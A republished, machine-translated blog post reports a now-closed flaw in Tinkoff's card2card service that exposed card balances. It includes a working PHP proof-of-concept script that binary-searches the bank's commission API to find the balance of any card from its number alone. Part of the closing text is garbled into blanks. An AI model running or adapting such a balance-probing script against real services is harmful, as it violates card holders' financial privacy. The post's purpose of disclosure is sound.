<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Tinkoff has compromised data on the balance of its clients' cards</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="UPD3: Vulnerability closed, the balance is no longer checked. 

 It all started with the fact that one evening he asked me a friend to throw him money...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Tinkoff has compromised data on the balance of its clients' cards</h1><div class="post__text post__text-html js-mediator-article">  <b>UPD3:</b> Vulnerability closed, the balance is no longer checked. <br><br>  It all started with the fact that one evening he asked me a friend to throw him money on the card.  I have always solved such problems either through the Internet Bank or through a mobile application, but since they have recently turned the Internet Bank into a wild monster, this time I decided to use their <a href="https://www.tinkoff.ru/cardtocard/">card2card</a> service. <br><br>  I fill myself quietly field, and then the unexpected happens: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/getpro/habr/post_images/ee9/3d8/5f2/ee93d85f2afca8a0f8eea8ca64e5d230.jpg"><br><a name="habracut"></a><br>  Wait, because I did not press the send button!  Where does this come from?  Played with the amount, checks the actual amount on the card. <br><br>  At first, I thought a sinful thing that the Ajax sends to the server all the card data, including the CVC and the expiration date, with each edit.  This, of course, disgusting, but https - let them do what they want.  I go to browser requests: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/de1/af1/272/de1af127219ef6ac2da88c11257c1e57.jpg"><br><br>  CVC is not transmitted, it is already interesting.  But then the validity period is transmitted, at least some kind of protection, I think, although still at a loss why to check the balance of the card by the Ajax on the fly. <br><br>  But nevertheless, the interest doesn‚Äôt end up completely and I edit the query: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b24/397/b94/b24397b9468200a03bb62a42f5943b05.jpg"><br><br>  Oops.  At the reverse end, nothing is checked except the sender‚Äôs card number. <br><br>  Obviously, using the simple brute force method, it is easy to choose the amount below which everything is ok, and the error is higher - this will be the balance of the card.  That is, knowing only the card number (which of course is not too public information, but not critical, many give card numbers to friends and even post them on the Internet to receive payments) you can find out how much money there is.  Moreover, as experiments have shown, no monthly limits do not affect this. <br><br>  The hole is not critical, but the availability of this information in real time allows you to keep track of all expenses / recharge - and this is more serious. <br><br>  Immediately unsubscribed Bezopasnik by publicly available mail, but the reaction, as usual, is zero. <br><br>  Quickly sketched proof of concept (do not hit hard, my programming experience is basic in school). <br><br><div class="spoiler">  <b class="spoiler_title">php inside</b> <div class="spoiler_text"><pre><code class="php">&lt;?php
header( 'Content-type: text/html; charset=utf-8' );

$card = $_GET['card'];
$card = preg_replace('/[^0-9]+/', '', $card);

if (strlen($card) != 16) {
	exit('&lt;br&gt;Wrong card number: ' . $card);
	
}

echo 'Probing card ' . $card . '... &lt;br&gt;';

flush();
ob_flush();
sleep(1);

$money = 50000;

$max = 1000000;
$min = 0;

$done = false;
$iter = 0;

while ($done == false) {

if($iter %5 == 0) {
  echo 'Still working, please hang on...&lt;br&gt;';
  flush();
  ob_flush();
  sleep(1);

}

$json = file_get_contents('https://www.tinkoff.ru/api/v1/payment_commission/?paymentType=Transfer¬§cy=RUB&amp;moneyAmount=' . $money . '&amp;provider=c2c-anytoany&amp;sessionid=1&amp;origin=prt&amp;cardNumber=' . $card . '&amp;fieldtoCardNumber=1&amp;fieldagreement=&amp;securityCode=cvc&amp;expiryDate=10/20');
$obj = json_decode($json);
$result = $obj-&gt;{'resultCode'};

  if ($result == "OK") {
    //need to increase
	$min = $money;
	$money = ($min + $max) /2;
	$last_total_money = round($obj-&gt;payload-&gt;total-&gt;value);
	
  } else {
    //need to decrease
	$max = $money;
	$money = ($min + $max) /2;
  }
  
  $iter++;
  
  if ((floor($max) - floor($min)) == 0) {
  
    $done = true;
	echo '&lt;br&gt;&lt;br&gt;Money amount is ' . $last_total_money . ' roubles.';
  }
  
  if ($iter &gt; 50) {
	  exit('&lt;br&gt;&lt;br&gt;Something went terribly wrong, or the bug is already fixed. Last amount is ' . $last_total_money);
  }
  
}

?&gt;
</code></pre></div></div><br>
    .  -   ,     ,     .  ,       ,    , ,     .<br>
<br>
<b> </b><br>
       ,           ,          (     ) .        .<br>
        ,       -     .        ,     .<br>
,  , ,     .</div><p>Source: <a href="https://habr.com/ru/post/307628/">https://habr.com/ru/post/307628/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../307618/index.html">History of programming languages: how Haskell became the standard of functional programming</a></li>
<li><a href="../307620/index.html">Errors of questionnaires. 1 error: sample offset. 8 ways to attract the right respondents</a></li>
<li><a href="../307622/index.html">Porting FreeModbus under STM32. Version from dinar</a></li>
<li><a href="../307624/index.html">The report on the results of "My Circle" for July 2016, and the most popular vacancies of the month</a></li>
<li><a href="../307626/index.html">Changes in CleverStyle Framework 5</a></li>
<li><a href="../307634/index.html">Top Selling Phones in History</a></li>
<li><a href="../307640/index.html">Recursion testing</a></li>
<li><a href="../307642/index.html">Tokenization in Russia: How the ‚Äúsafe‚Äù technology of contactless payments from Visa and Mastercard will work</a></li>
<li><a href="../307644/index.html">‚ÄúTo get above average, we need some kind of motivation beyond money‚Äù - an interview with Ruslan Cheremin</a></li>
<li><a href="../307646/index.html">HelloHome Case Study</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>